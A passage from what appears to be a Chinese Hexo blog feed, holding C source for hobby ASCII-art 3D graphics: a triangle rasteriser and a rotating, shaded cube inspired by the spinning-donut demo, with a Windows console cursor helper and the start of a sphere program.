class="comment">//判断当前屏幕的点是否在三角形范围内</span></span><br><span class="line">                        <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                                ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                            inside=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(inside)&#123;</span><br><span class="line">                        <span class="comment">/*测试代码：方程阈值检验</span></span><br><span class="line"><span class="comment">                        if(sx==0)&#123;</span></span><br><span class="line"><span class="comment">                            for(int i=0;i&lt;3&amp;&amp;inside;i++)&#123;</span></span><br><span class="line"><span class="comment">                                double b=(tCenter[1]-y[i==0?1:i==1?0:0])*(x[i==0?2:i==1?2:1]-x[i==0?1:i==1?0:0]);</span></span><br><span class="line"><span class="comment">                                double c=(y[i==0?2:i==1?2:1]-y[i==0?1:i==1?0:0])*(tCenter[0]-x[i==0?1:i==1?0:0]);\</span></span><br><span class="line"><span class="comment">                                double d=b-c;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        //*/</span></span><br><span class="line">                        <span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                        <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span>&#123;<span class="comment">//求三角形平面方程算出点到屏幕距离</span></span><br><span class="line">                            p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                            currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                            <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                                alpha=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                                dis[sy][sx]=currentDis;</span><br><span class="line">                                out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="comment">///*输出到终端</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,shade[outIndex],shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">15</span>);</span><br><span class="line">        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p align="right"><small>Correct, but not totally correct, meet hypercubes O(∩_∩)O</small></p>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 摸鱼 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图形学HelloWorld</title>
      <link href="2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/"/>
      <url>2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/</url>
      
        <content type="html"><![CDATA[<p>逛b站看到会转的甜甜圈，对图形学有点上头，自己拿蜥语言做个立方体玩玩</p><img src="/images/图形学HelloWorld.gif" height="200" width="200" /><span id="more"></span><h1 id="图形学HelloWorld"><a href="#图形学HelloWorld" class="headerlink" title="图形学HelloWorld"></a>图形学HelloWorld</h1><p>既然是HelloWorld那就没什么好解释的了O(∩_∩)O</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 51<span class="comment">//规定屏幕大小</span></span></span><br><span class="line"><span class="comment">////cal_r用来算个模长</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">cal_r</span><span class="params">(<span class="keyword">float</span> x,<span class="keyword">float</span> y,<span class="keyword">float</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(x*x+y*y+z*z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,;!o*m0&amp;%@&quot;</span>;<span class="comment">//阴影字符集</span></span><br><span class="line"><span class="keyword">int</span> out_i[size][size];<span class="comment">//记录亮度，映射到字符集</span></span><br><span class="line"><span class="keyword">float</span> dyn=<span class="number">4.0</span>;<span class="comment">//开合幅度</span></span><br><span class="line"><span class="keyword">float</span> a=<span class="number">8.0</span>;<span class="comment">//立方体边长</span></span><br><span class="line"><span class="keyword">float</span> delta=<span class="number">0.75</span>;<span class="comment">//遍历立方体的步长</span></span><br><span class="line"><span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//从坐标原点偏移到屏幕中心所需的偏移量</span></span><br><span class="line"><span class="keyword">float</span> dis[size][size];<span class="comment">//记录最小距离，由此判断遮罩关系</span></span><br><span class="line"><span class="comment">//cal_shade用来算个阴影</span></span><br><span class="line"><span class="comment">//Par&#123;n_i是被选中相对不变的方向,相当于此方向穿过平面;n_j作为判定是上平面还是下平面的值，只可能是1或-1&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_shade</span><span class="params">(<span class="keyword">float</span> *n,<span class="keyword">int</span> n_i,<span class="keyword">int</span> n_j,<span class="keyword">float</span> *ro_a,<span class="keyword">float</span> *ro_b,<span class="keyword">float</span> *ro_c,<span class="keyword">float</span> *light,<span class="keyword">float</span> rotate,<span class="keyword">int</span> *out_i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)n[i]=i==n_i?n_j:<span class="number">0</span>;<span class="comment">//确定原始法向量n[]</span></span><br><span class="line">    <span class="keyword">float</span> n_a[<span class="number">3</span>]=&#123;n[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">6</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">7</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">8</span>]&#125;;<span class="comment">//法向量第一次旋转</span></span><br><span class="line">    <span class="keyword">float</span> n_b[<span class="number">3</span>]=&#123;n_a[<span class="number">0</span>]*ro_b[<span class="number">0</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">3</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">6</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">1</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">4</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">7</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">2</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">5</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">8</span>]&#125;;<span class="comment">//法向量第二次旋转</span></span><br><span class="line">    <span class="keyword">float</span> n_r[<span class="number">3</span>]=&#123;n_b[<span class="number">0</span>]*ro_c[<span class="number">0</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">3</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">6</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">1</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">4</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">7</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">2</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">5</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">8</span>]&#125;;</span><br><span class="line">    <span class="comment">//n_r[]作为绕三轴旋转rotate角度后的法向量</span></span><br><span class="line">    <span class="keyword">float</span> result=(n_r[<span class="number">0</span>]*light[<span class="number">0</span>]+n_r[<span class="number">1</span>]*light[<span class="number">1</span>]+n_r[<span class="number">2</span>]*light[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;<span class="comment">//点积求反光强度(亮度)，并映射到[0,1]</span></span><br><span class="line">    <span class="keyword">float</span> co[<span class="number">3</span>];<span class="comment">//正方体的原始坐标，co意为coordinate</span></span><br><span class="line">    co[n_i]=dyn*<span class="built_in">cos</span>(rotate*<span class="number">2</span>);<span class="comment">//make it 20% cooler</span></span><br><span class="line">    <span class="keyword">int</span> co_a=n_i==<span class="number">0</span>?<span class="number">1</span>:n_i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> co_b=n_i==<span class="number">0</span>?<span class="number">2</span>:n_i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;<span class="comment">//确定了index为n_i的坐标是不需要被遍历的</span></span><br><span class="line">    co[n_i]+=move/<span class="number">2</span>;<span class="comment">//无需遍历的方向偏移1/4个屏幕边长</span></span><br><span class="line">    <span class="keyword">for</span>(co[co_a]=-a;co[co_a]&lt;=a;co[co_a]+=delta)</span><br><span class="line">        <span class="keyword">for</span>(co[co_b]=-a;co[co_b]&lt;=a;co[co_b]+=delta)&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">final</span>=(<span class="keyword">int</span>)(result*<span class="number">10.0</span>);<span class="comment">//把亮度int化</span></span><br><span class="line">            <span class="keyword">final</span>=(<span class="keyword">final</span>&gt;<span class="number">10</span>||<span class="keyword">final</span>)&lt;<span class="number">0</span>?<span class="keyword">final</span>&gt;<span class="number">10</span>?<span class="number">10</span>:<span class="number">0</span>:<span class="keyword">final</span>;<span class="comment">//保险，防止一些刁钻情况</span></span><br><span class="line">            <span class="keyword">float</span> x_a=co[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_a=co[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_a=co[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">8</span>];<span class="comment">//坐标第一次旋转</span></span><br><span class="line">            <span class="keyword">float</span> x_b=x_a*ro_b[<span class="number">0</span>]+y_a*ro_b[<span class="number">3</span>]+z_a*ro_b[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_b=x_a*ro_b[<span class="number">1</span>]+y_a*ro_b[<span class="number">4</span>]+z_a*ro_b[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_b=x_a*ro_b[<span class="number">2</span>]+y_a*ro_b[<span class="number">5</span>]+z_a*ro_b[<span class="number">8</span>];<span class="comment">//坐标第二次旋转</span></span><br><span class="line">            <span class="keyword">float</span> x_r=x_b*ro_c[<span class="number">0</span>]+y_b*ro_c[<span class="number">3</span>]+z_b*ro_c[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_r=x_b*ro_c[<span class="number">1</span>]+y_b*ro_c[<span class="number">4</span>]+z_b*ro_c[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_r=x_b*ro_c[<span class="number">2</span>]+y_b*ro_c[<span class="number">5</span>]+z_b*ro_c[<span class="number">8</span>];</span><br><span class="line">            <span class="comment">//co_r作为绕三轴旋转rotate角度后的空间坐标</span></span><br><span class="line">            <span class="keyword">int</span> cox=(<span class="keyword">int</span>)(n_j*x_r+move);</span><br><span class="line">            <span class="keyword">int</span> coy=(<span class="keyword">int</span>)(n_j*z_r+move);<span class="comment">//找到投影到屏幕上的点在哪</span></span><br><span class="line">            <span class="keyword">if</span>(n_j*y_r&lt;dis[cox][coy])&#123;<span class="comment">//只有发现更近的点才替换亮度</span></span><br><span class="line">                out_i[cox*size+coy]=<span class="keyword">final</span>;</span><br><span class="line">                dis[cox][coy]=n_j*y_r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> n[<span class="number">3</span>];<span class="comment">//原始法向量n[]</span></span><br><span class="line">    <span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//平行光向量</span></span><br><span class="line">    <span class="keyword">float</span> length=cal_r(light[<span class="number">0</span>],light[<span class="number">1</span>],light[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)light[i]/=length;<span class="comment">//单位化平行光向量</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;<span class="comment">//rotate为旋转角度，增量即旋转速度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">4.0</span>*size);</span><br><span class="line">                <span class="comment">//初始化亮度与距离</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">float</span> cos_ro=<span class="built_in">cos</span>(rotate),sin_ro=<span class="built_in">sin</span>(rotate);</span><br><span class="line">        <span class="keyword">float</span> ro_a[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,cos_ro,-sin_ro&#125;,&#123;<span class="number">0</span>,sin_ro,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_b[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,<span class="number">0</span>,sin_ro&#125;,&#123;<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>&#125;,&#123;-sin_ro,<span class="number">0</span>,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_c[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,-sin_ro,<span class="number">0</span>&#125;,&#123;sin_ro,cos_ro,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">//旋转矩阵，ro表rotate</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//算个阴影，第三个参数控制对应面</span></span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">-1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++) out_i[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">        <span class="comment">//跟着甜甜圈抄的，这样才能稳定住图像</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dev C++下则调用Windows.h来解决图像刷新的问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_O</span><span class="params">()</span><span class="comment">//CSDN上抄的函数，刷新一快光标就飘来飘去，看起来像噪点一样</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld.gif"></p><p>最开始先写了个光源移动球</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_xy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   HANDLE hOut;</span><br><span class="line">hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">   COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">   SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line"><span class="keyword">int</span> size=<span 